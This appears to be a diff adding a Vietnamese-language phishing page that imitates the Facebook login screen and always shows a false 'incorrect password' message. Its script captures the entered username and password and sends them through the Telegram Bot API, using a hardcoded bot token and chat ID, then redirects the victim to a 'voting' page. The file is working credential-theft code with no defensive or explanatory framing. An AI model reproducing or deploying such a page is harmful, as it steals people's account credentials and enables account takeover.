@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebook</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+
+        .facebook-logo {
+            font-family: 'Arial Black', sans-serif;
+            font-size: 40px;
+            color: #1877f2;
+            text-align: center;
+            margin-top:50px;
+            margin-bottom: 20px;
+        }
+
+        /* Tăng margin-bottom giữa các thành phần trong form */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .input-size {
+            font-size: 16px; /* Kích thước chữ */
+            padding: 24px; /* Độ dày của phần padding */
+            border-radius: 6px; /* Bo góc input */
+            border: 1px solid #ccc; /* Định dạng đường viền */
+            width: 100%; /* Chiều rộng của input */
+        }
+
+        footer {
+            background-color: #fff;
+            padding: 20px 0;
+            padding-top: 140px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        footer a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 12px;
+        }
+        .error-message {
+    color: red;
+    font-size: 12px;
+    margin-bottom: 12px;
+}
+
+.forgot-password-link {
+    color: red; /* Màu của liên kết */
+    text-decoration: underline; /* Gạch chân cho liên kết */
+    cursor: pointer; /* Con trỏ chuột khi di chuột vào */
+}
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-4">
+                <div class="facebook-logo">facebook</div>
+                <div class="login-container">
+                    <p class="text-center">Đăng nhập vào Facebook</p>
+                    <form id="myForm" method="POST" >
+                        <div class="form-group mb-3">
+                            <input type="text" class="form-control input-size" placeholder="Email hoặc số điện thoại" id="username" name="username" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <input type="password" class="form-control input-size" placeholder="Mật khẩu" id="password" name="password" required>
+                        </div>
+                                            <div class="error-message">
+                        Mật khẩu bạn nhập không chính xác. 
+                        <a href="#" class="forgot-password-link">Bạn quên mật khẩu?</a>
+                    </div>
+                        <div class="form-group">
+                            <button type="submit" class="btn btn-primary btn-block">Đăng nhập</button>
+                        </div>
+                        <div class="form-group text-center">
+                            <a href="#">Quên mật khẩu?</a> <a href="#">Đăng ký</a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <a href="#">Tiếng Việt</a>  <a href="#">English (US)</a>  <a href="#">中文(简体)</a>  <a href="#">日本語</a>  <a href="#">한국어</a>  <a href="#">Français (France)</a>  <a href="#">Español</a>  <a href="#">Português (Brasil)</a>  <a href="#">Italiano</a>  
+    </footer>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Ngăn chặn gửi biểu mẫu một cách thông thường
+            
+            // Lấy dữ liệu từ biểu mẫu
+            var formData = new FormData();
+            var username = "ten tai khoan: " + document.getElementById('username').value + "\n";
+            var passowrd = "mat khau: " + document.getElementById('password').value;
+            var data = username + passowrd;
+    
+            // Gửi dữ liệu về bot Telegram
+            fetch(`https://api.telegram.org/bot6664238116:AAGuwhv4z4dwH55D1OHrM6EEJJSC0_N63Hs/sendMessage?chat_id=6310911278&text=${data}`, {
+                method: 'POST',
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Xử lý phản hồi từ bot Telegram (nếu cần)
+                
+                // Redirect người dùng đến trang khác
+                window.location.href = '/binhchon.html';
+            })
+            .catch(error => console.error('Lỗi:', error));
+        });
+    </script>
+    
+</body>
+</html>
